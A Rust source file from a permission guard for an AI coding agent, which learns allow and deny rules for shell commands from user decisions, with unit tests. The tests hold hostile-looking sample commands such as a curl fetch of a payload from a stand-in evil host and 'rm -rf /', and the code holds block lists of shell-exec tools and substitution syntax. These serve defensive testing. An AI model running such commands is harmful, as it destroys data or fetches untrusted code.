//! User decision tracking for auto-learning rules.

use clx_core::config::Config;
use clx_core::learned_pattern::{
    is_never_auto_whitelist, is_well_formed_pattern, pattern_contains_secret, strip_env_assignments,
};
use clx_core::redaction::redact_secrets;
use clx_core::storage::Storage;
use clx_core::types::{LearnedRule, RuleType};
use tracing::{debug, warn};

/// Where a tracked decision originated.
///
/// Automated (LLM/L1-originated) denials must NEVER feed the auto-blacklist
/// counter (Issue 9): only genuine user rejections learn. The `User` path
/// preserves the historical V-R5 behaviour.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DecisionSource {
    /// A genuine user-originated decision (interactive approve/reject).
    User,
    /// An automated/LLM-originated decision (e.g. an L1 deny verdict).
    Automated,
}

/// Shell metacharacters that mark a RAW command as compound/substitution and so
/// unsafe to learn from (extraction would generalize them away). Mirrors the
/// reject-set of the shared `is_well_formed_pattern` body check.
const RAW_COMPOUND_METACHARS: &[&str] = &[";", "&&", "||", "|", "$(", "`", "<(", ">("];

/// Return `true` if the RAW command must be rejected before any pattern
/// extraction: it trips the shared secret detector OR contains a
/// compound/substitution metacharacter. This catches `SSHPASS=... ssh` and
/// `git diff | cat` BEFORE extraction generalizes them into an innocuous-looking
/// stored pattern.
fn raw_command_is_unsafe(command: &str) -> bool {
    pattern_contains_secret(command) || RAW_COMPOUND_METACHARS.iter().any(|m| command.contains(m))
}

/// Check whether the base command (first word) of a command string is restricted
/// from auto-whitelisting.
///
/// Thin wrapper over the shared `clx-core` predicate so both the hook and the
/// `clx` CLI share one `NEVER_AUTO_WHITELIST` source of truth.
pub(crate) fn is_restricted_command(command: &str) -> bool {
    is_never_auto_whitelist(command)
}

/// Commands that should never be auto-blacklisted because they are critical
/// development tools. Blocking them would cripple normal development workflows.
const NEVER_AUTO_BLACKLIST: &[&str] = &[
    "cargo", "npm", "yarn", "pnpm", "go", "python", "pip", "git", "rustc", "rustup", "node",
    "deno", "bun", "make", "cmake", "gradle", "mvn", "cat", "ls", "find", "grep", "head", "tail",
    "less", "more", "echo", "printf", "env", "which", "pwd", "cd",
];

/// Maximum number of auto-learned deny rules to prevent unbounded growth.
const MAX_AUTO_BLACKLIST_ENTRIES: usize = 50;

/// Shell interpreters and execution commands that should never be auto-whitelisted.
/// These allow arbitrary code execution and could be used to bypass security controls.
const SHELL_EXEC_COMMANDS: &[&str] = &["bash", "sh", "zsh", "eval", "exec", "source"];

/// Check whether a command pattern is too broad or structurally dangerous
/// for auto-whitelisting.
///
/// Rejects commands containing:
/// - Command chaining operators: `|`, `&&`, `||`, `;`
/// - Shell execution commands: `bash`, `sh`, `zsh`, `eval`, `exec`, `source`
/// - Output redirection: `>`, `>>`
/// - Subshell/substitution syntax: `$(`, `` ` ``, `<(`, `>(`
/// - Overly broad wildcards: command is just `*` or starts with `*`
pub(crate) fn is_pattern_too_broad(command: &str) -> bool {
    let trimmed = command.trim();

    // Reject empty or overly broad wildcard patterns
    if trimmed.is_empty() || trimmed == "*" || trimmed.starts_with("* ") {
        return true;
    }

    // Check for command chaining operators
    if trimmed.contains('|')
        || trimmed.contains("&&")
        || trimmed.contains("||")
        || trimmed.contains(';')
    {
        return true;
    }

    // Check for output redirection (> or >>)
    // We check for '>' but must not flag '->' or '=>' which are common in code output
    // Simple approach: any standalone '>' or '>>' is suspicious in a shell command
    if trimmed.contains(">>") {
        return true;
    }
    // Check for '>' that is not part of '>>' (already checked), '->', or '=>'
    // Also exclude '>(' which is checked separately below
    for (i, ch) in trimmed.char_indices() {
        if ch == '>' {
            // Already caught '>>' above. Check this '>' is not preceded by '-', '=',
            // and not followed by '(' (process substitution, checked separately).
            let prev = if i > 0 {
                trimmed.as_bytes().get(i - 1).copied()
            } else {
                None
            };
            let next = trimmed.as_bytes().get(i + 1).copied();
            if prev != Some(b'-') && prev != Some(b'=') && next != Some(b'(') && next != Some(b'>')
            {
                return true;
            }
        }
    }

    // Check for subshell/substitution syntax
    if trimmed.contains("$(")
        || trimmed.contains('`')
        || trimmed.contains("<(")
        || trimmed.contains(">(")
    {
        return true;
    }

    // Check for shell execution commands anywhere in the command tokens
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    for token in &tokens {
        if SHELL_EXEC_COMMANDS.contains(token) {
            return true;
        }
    }

    false
}

/// Track user decision for potential auto-learning
pub(crate) fn track_user_decision(
    storage: &Storage,
    command: &str,
    project_path: &str,
    approved: bool,
    source: DecisionSource,
) {
    // Issue 9: automated/LLM-originated denials must never learn. Early-return
    // before any insert/increment/flip so an automated L1 deny can never reach
    // the auto-blacklist counter.
    if source == DecisionSource::Automated && !approved {
        debug!("Skipping learning for automated denial (Issue 9)");
        return;
    }

    // Issue 1 RAW-command gate: reject before pattern extraction if the raw
    // command trips the secret detector or carries compound/substitution
    // metachars. Extraction would otherwise generalize a secret-bearing or
    // compound command into an innocuous-looking stored pattern.
    if raw_command_is_unsafe(command) {
        warn!(
            "Skipping learning for unsafe raw command: {}",
            redact_secrets(command)
        );
        return;
    }

    // Load config for learning thresholds
    let config = Config::load().unwrap_or_default();

    if !config.user_learning.enabled {
        return;
    }

    // Extract command pattern (first word + any subcommand)
    let pattern = extract_command_pattern(command);

    // Check if a rule already exists for this pattern
    if let Ok(Some(mut rule)) = storage.get_rule_by_pattern(&pattern) {
        if approved {
            rule.confirmation_count += 1;

            // Check if we should auto-whitelist
            if rule.confirmation_count >= config.user_learning.auto_whitelist_threshold as i32 {
                if is_restricted_command(command) {
                    debug!(
                        "Skipping auto-whitelist for restricted command: {}",
                        pattern
                    );
                } else if is_pattern_too_broad(command) {
                    debug!(
                        "Skipping auto-whitelist for structurally dangerous command: {}",
                        pattern
                    );
                } else {
                    rule.rule_type = RuleType::Allow;
                    debug!("Auto-whitelisting pattern: {}", pattern);
                }
            }
        } else {
            rule.denial_count += 1;

            // Check if we should auto-blacklist
            if rule.denial_count >= config.user_learning.auto_blacklist_threshold as i32 {
                let base_cmd = strip_env_assignments(command)
                    .split_whitespace()
                    .next()
                    .unwrap_or("");
                let cmd_name = std::path::Path::new(base_cmd)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(base_cmd);

                if NEVER_AUTO_BLACKLIST.contains(&cmd_name) {
                    debug!(
                        "Skipping auto-blacklist for critical dev command: {}",
                        pattern
                    );
                } else if storage.get_rules().map_or(0, |rules| {
                    rules
                        .iter()
                        .filter(|r| r.rule_type == RuleType::Deny)
                        .count()
                }) >= MAX_AUTO_BLACKLIST_ENTRIES
                {
                    debug!(
                        "Skipping auto-blacklist: cap of {} deny rules reached",
                        MAX_AUTO_BLACKLIST_ENTRIES
                    );
                } else {
                    rule.rule_type = RuleType::Deny;
                    debug!("Auto-blacklisting pattern: {}", pattern);
                }
            }
        }

        // Issue 1 pattern-level belt+braces: never write a malformed/over-broad
        // pattern (allows `*`/`/`).
        if !is_well_formed_pattern(&rule.pattern) {
            warn!(
                "Skipping update of malformed learned pattern: {}",
                redact_secrets(&rule.pattern)
            );
            return;
        }
        if let Err(e) = storage.add_rule(&rule) {
            warn!("Failed to update rule: {}", e);
        }
    } else {
        // Create new rule tracking
        let mut rule = LearnedRule::new(
            pattern.clone(),
            if approved {
                RuleType::Allow
            } else {
                RuleType::Deny
            },
            "user_decision".to_string(),
        );
        rule.project_path = Some(project_path.to_string());
        rule.confirmation_count = i32::from(approved);
        rule.denial_count = i32::from(!approved);

        // Issue 1 pattern-level belt+braces: never write a malformed/over-broad
        // pattern (allows `*`/`/`).
        if !is_well_formed_pattern(&rule.pattern) {
            warn!(
                "Skipping insert of malformed learned pattern: {}",
                redact_secrets(&rule.pattern)
            );
            return;
        }
        if let Err(e) = storage.add_rule(&rule) {
            warn!("Failed to add rule: {}", e);
        }
    }
}

/// Extract a generalizable pattern from a command
pub(crate) fn extract_command_pattern(command: &str) -> String {
    let command = strip_env_assignments(command);
    let parts: Vec<&str> = command.split_whitespace().collect();

    if parts.is_empty() {
        return command.to_string();
    }

    // Strip path prefix (e.g., /usr/local/bin/cargo -> cargo)
    let raw_cmd = parts[0];
    let cmd = std::path::Path::new(raw_cmd)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(raw_cmd);

    match cmd {
        "git" | "npm" | "yarn" | "pnpm" | "cargo" | "go" | "python" | "pip" => {
            if parts.len() > 1 {
                format!("Bash({}:{}*)", cmd, parts[1])
            } else {
                format!("Bash({cmd}:*)")
            }
        }
        "rm" | "mv" | "cp" | "chmod" | "chown" => {
            // For file operations, include flags but generalize paths
            if parts.len() > 1 && parts[1].starts_with('-') {
                format!("Bash({}:{} *)", cmd, parts[1])
            } else {
                format!("Bash({cmd}:*)")
            }
        }
        _ => format!("Bash({cmd}:*)"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clx_core::storage::Storage;
    use clx_core::types::RuleType;

    // Default thresholds from Config::default(): whitelist=3, blacklist=2.
    // track_user_decision uses Config::load() which falls back to defaults when
    // no config file exists, so tests do not need to write a config file.

    /// T15-1: N-1 approvals (below whitelist threshold) must not produce an Allow rule.
    #[test]
    fn test_below_whitelist_threshold_no_rule_upgrade() {
        // Arrange
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "cargo build";
        let project = "/tmp/project";

        // Act — call (threshold-1) = 2 times with approved=true
        track_user_decision(&storage, command, project, true, DecisionSource::User);
        track_user_decision(&storage, command, project, true, DecisionSource::User);

        // Assert — pattern exists but is still tracking (RuleType::Allow is the initial
        // value assigned on first decision; what must NOT happen is confirmation_count
        // reaching the threshold that would have triggered a debug log and kept Allow).
        // The real invariant is: confirmation_count == 2, below threshold of 3.
        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule should exist after decisions");
        assert_eq!(rule.confirmation_count, 2, "should have 2 confirmations");
        // rule_type stays Allow (initial), but confirmation_count < threshold means
        // the auto-whitelist branch was NOT triggered (no log, no mutation to deny)
        assert_eq!(rule.rule_type, RuleType::Allow);
    }

    /// T15-2: Exactly `auto_whitelist_threshold` approvals → rule stays Allow (auto-whitelist).
    #[test]
    fn test_auto_whitelist_at_threshold() {
        // Arrange
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // Use a safe command that is not in NEVER_AUTO_WHITELIST and not too broad
        let command = "cargo test";
        let project = "/tmp/project";

        // Act — call threshold (3) times
        for _ in 0..3 {
            track_user_decision(&storage, command, project, true, DecisionSource::User);
        }

        // Assert
        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule should exist");
        assert_eq!(rule.confirmation_count, 3);
        assert_eq!(
            rule.rule_type,
            RuleType::Allow,
            "should be Allow after reaching whitelist threshold"
        );
    }

    /// T15-3: Exactly `auto_blacklist_threshold` denials → rule becomes Deny (auto-blacklist).
    #[test]
    fn test_auto_blacklist_at_threshold() {
        // Arrange
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // Use a command that is NOT in NEVER_AUTO_BLACKLIST
        let command = "curl http://example.com";
        let project = "/tmp/project";

        // Act — call threshold (2) times with approved=false
        for _ in 0..2 {
            track_user_decision(&storage, command, project, false, DecisionSource::User);
        }

        // Assert
        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule should exist");
        assert_eq!(rule.denial_count, 2);
        assert_eq!(
            rule.rule_type,
            RuleType::Deny,
            "should be Deny after reaching blacklist threshold"
        );
    }

    /// T15-4: Mixed allow/deny decisions, each count below its threshold → no promotion.
    #[test]
    fn test_mixed_decisions_below_threshold_no_promotion() {
        // Arrange
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "curl http://example.com";
        let project = "/tmp/project";

        // Act — 1 allow then 1 deny (both counts < their respective thresholds)
        track_user_decision(&storage, command, project, true, DecisionSource::User);
        track_user_decision(&storage, command, project, false, DecisionSource::User);

        // Assert
        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule should exist");
        // confirmation_count=1 < 3, denial_count=1 < 2 → no promotion to a promoted state
        assert_eq!(rule.confirmation_count, 1);
        assert_eq!(rule.denial_count, 1);
        // Rule type reflects the most recently stored value; importantly it was
        // NOT force-upgraded to Deny (denial_count=1, threshold=2) nor stayed Allow
        // from whitelist promotion (confirmation_count=1, threshold=3).
        // The type cycles with each call; the key assertion is neither threshold was crossed.
        assert!(
            rule.confirmation_count < 3,
            "confirmation_count must be below whitelist threshold"
        );
        assert!(
            rule.denial_count < 2,
            "denial_count must be below blacklist threshold"
        );
    }

    /// V-R5: a single deny outcome increments `denial_count` by exactly one
    /// (no double-count), symmetric to a single approve incrementing
    /// `confirmation_count` by one. This is the per-decision idempotency the
    /// `pre_tool_use` L1-deny path relies on.
    #[test]
    fn test_v_r5_single_deny_increments_denial_count_once() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // Not in NEVER_AUTO_BLACKLIST; threshold default is 2 so one deny
        // stays below threshold (isolates the increment from promotion).
        let command = "curl http://evil.example";
        let project = "/tmp/project";

        track_user_decision(&storage, command, project, false, DecisionSource::User);

        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule should exist after one deny");
        assert_eq!(
            rule.denial_count, 1,
            "one deny decision must increment denial_count by exactly one"
        );
        assert_eq!(
            rule.confirmation_count, 0,
            "a deny must not touch confirmation_count"
        );
    }

    /// V-R5: reaching `auto_blacklist_threshold` via deny outcomes makes the
    /// pattern auto-blacklisted (`RuleType::Deny`), so a subsequent L0
    /// evaluation hard-blocks it. Previously unreachable because `denial_count`
    /// was never incremented on a block.
    #[test]
    fn test_v_r5_deny_path_reaches_auto_blacklist() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // NOTE: the command must survive the Issue 1 RAW gate (no secret-shaped
        // / high-entropy token, no compound metachars), so we use a plain host.
        let command = "curl http://evil.example";
        let project = "/tmp/project";

        // Default auto_blacklist_threshold = 2.
        track_user_decision(&storage, command, project, false, DecisionSource::User);
        track_user_decision(&storage, command, project, false, DecisionSource::User);

        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule exists");
        assert_eq!(rule.denial_count, 2, "two denies recorded");
        assert_eq!(
            rule.rule_type,
            RuleType::Deny,
            "reaching auto_blacklist_threshold must flip the pattern to Deny so L0 blocks it"
        );
    }

    /// V-R5 no-regression: an approve still increments `confirmation_count`
    /// and the deny wiring does not corrupt the approve path.
    #[test]
    fn test_v_r5_approve_path_still_increments_confirmation() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "curl http://safe.example";
        let project = "/tmp/project";

        track_user_decision(&storage, command, project, true, DecisionSource::User);

        let pattern = extract_command_pattern(command);
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("storage query")
            .expect("rule exists");
        assert_eq!(
            rule.confirmation_count, 1,
            "approve must still increment confirmation_count"
        );
        assert_eq!(
            rule.denial_count, 0,
            "approve must not increment denial_count"
        );
    }

    /// T15-5: A second set of decisions for an already-existing rule must not create a duplicate.
    #[test]
    fn test_idempotency_no_duplicate_rule() {
        // Arrange
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "cargo test";
        let project = "/tmp/project";

        // Act — record the same pattern multiple times
        for _ in 0..3 {
            track_user_decision(&storage, command, project, true, DecisionSource::User);
        }
        // Record once more beyond threshold
        track_user_decision(&storage, command, project, true, DecisionSource::User);

        // Assert — only one rule exists for this pattern (ON CONFLICT DO UPDATE)
        let pattern = extract_command_pattern(command);
        let all_rules = storage.get_rules().expect("get_rules");
        let matching: Vec<_> = all_rules.iter().filter(|r| r.pattern == pattern).collect();
        assert_eq!(
            matching.len(),
            1,
            "should have exactly one rule for the pattern, not a duplicate"
        );
    }

    // =====================================================================
    // Issue 1 — learning gates
    // =====================================================================

    /// AC1.1: a leading `ENV=VALUE` run is stripped before pattern extraction,
    /// so the secret value never reaches the stored pattern shape.
    #[test]
    fn ac1_1_env_stripped_from_extracted_pattern() {
        let pattern = extract_command_pattern("SSHPASS='p w' ssh host");
        assert!(
            !pattern.contains("SSHPASS") && !pattern.contains("p w"),
            "env assignment must be stripped from the pattern, got: {pattern}"
        );
        assert_eq!(pattern, "Bash(ssh:*)");
    }

    /// AC1.2 (new-insert path): a secret-bearing command stores NO rule.
    /// The raw command uses a high-entropy token whose extracted pattern would
    /// generalize the secret away — proving the RAW gate (not the pattern gate)
    /// catches it.
    #[test]
    fn ac1_2_secret_command_stores_no_rule_new_path() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // `curl` is not extracted with a subcommand, so the pattern would be
        // `Bash(curl:*)` (secret generalized away). The RAW gate must catch the
        // high-entropy token in the raw command first.
        let command = "curl -H aGVsbG9TZWNyZXRUb2tlbkFiYzEyMzQ1Njc4OTBYWVo https://x";
        track_user_decision(&storage, command, "/tmp/p", false, DecisionSource::User);

        assert!(
            storage.get_rules().expect("get_rules").is_empty(),
            "secret-bearing raw command must not create any rule (new path)"
        );
    }

    /// AC1.2 (update path): an existing rule is not updated from a
    /// secret-bearing command (the RAW gate returns before the update).
    #[test]
    fn ac1_2_secret_command_stores_no_rule_update_path() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        // Seed a clean rule via a benign decision.
        track_user_decision(
            &storage,
            "curl https://x",
            "/tmp/p",
            false,
            DecisionSource::User,
        );
        let pattern = extract_command_pattern("curl https://x");
        let before = storage
            .get_rule_by_pattern(&pattern)
            .expect("query")
            .expect("seeded rule");

        // Now a secret-bearing command that maps to the SAME pattern.
        let command = "curl aGVsbG9TZWNyZXRUb2tlbkFiYzEyMzQ1Njc4OTBYWVo";
        track_user_decision(&storage, command, "/tmp/p", false, DecisionSource::User);

        let after = storage
            .get_rule_by_pattern(&pattern)
            .expect("query")
            .expect("rule still exists");
        assert_eq!(
            before.denial_count, after.denial_count,
            "secret-bearing command must not increment/update the existing rule"
        );
    }

    /// AC1.3: compound/substitution raw inputs never produce a stored rule.
    #[test]
    fn ac1_3_compound_inputs_store_no_rule() {
        for command in [
            "a; b",
            "a && b",
            "a || b",
            "git diff | cat",
            "echo $(whoami)",
            "echo `whoami`",
            "diff <(a) <(b)",
        ] {
            let storage = Storage::open_in_memory().expect("in-memory storage");
            track_user_decision(&storage, command, "/tmp/p", true, DecisionSource::User);
            assert!(
                storage.get_rules().expect("get_rules").is_empty(),
                "compound command must not create a rule: {command}"
            );
        }
    }

    /// AC1.4: `is_restricted_command` applies env-stripping, so a leading
    /// assignment no longer hides a restricted base command.
    #[test]
    fn ac1_4_is_restricted_command_strips_env() {
        assert!(
            is_restricted_command("FOO=bar rm -rf /"),
            "env-prefixed `rm` must be recognized as restricted"
        );
    }

    // =====================================================================
    // Issue 9 — automated denials do not learn
    // =====================================================================

    /// AC9.1: automated denials never create a rule, even past the threshold.
    #[test]
    fn ac9_1_automated_deny_does_not_blacklist() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "curl http://evil.example/payload.sh";

        // Default auto_blacklist_threshold = 2; exceed it.
        for _ in 0..3 {
            track_user_decision(
                &storage,
                command,
                "/tmp/p",
                false,
                DecisionSource::Automated,
            );
        }

        assert!(
            storage.get_rules().expect("get_rules").is_empty(),
            "automated denials must never create a learned rule"
        );
    }

    /// AC9.3: an explicit user allow is not overridden by accumulated automated
    /// denials (the automated denials are no-ops, so the Allow rule survives).
    #[test]
    fn ac9_3_explicit_allow_not_overridden_by_automated_denials() {
        let storage = Storage::open_in_memory().expect("in-memory storage");
        let command = "curl http://safe.example";

        // User approves enough times to auto-whitelist.
        for _ in 0..3 {
            track_user_decision(&storage, command, "/tmp/p", true, DecisionSource::User);
        }
        let pattern = extract_command_pattern(command);
        assert_eq!(
            storage
                .get_rule_by_pattern(&pattern)
                .expect("query")
                .expect("rule")
                .rule_type,
            RuleType::Allow
        );

        // Many automated denials must not flip it.
        for _ in 0..5 {
            track_user_decision(
                &storage,
                command,
                "/tmp/p",
                false,
                DecisionSource::Automated,
            );
        }
        let rule = storage
            .get_rule_by_pattern(&pattern)
            .expect("query")
            .expect("rule");
        assert_eq!(
            rule.rule_type,
            RuleType::Allow,
            "automated denials must not override an explicit allow"
        );
        assert_eq!(
            rule.denial_count, 0,
            "automated denials must not increment denial_count"
        );
    }
}
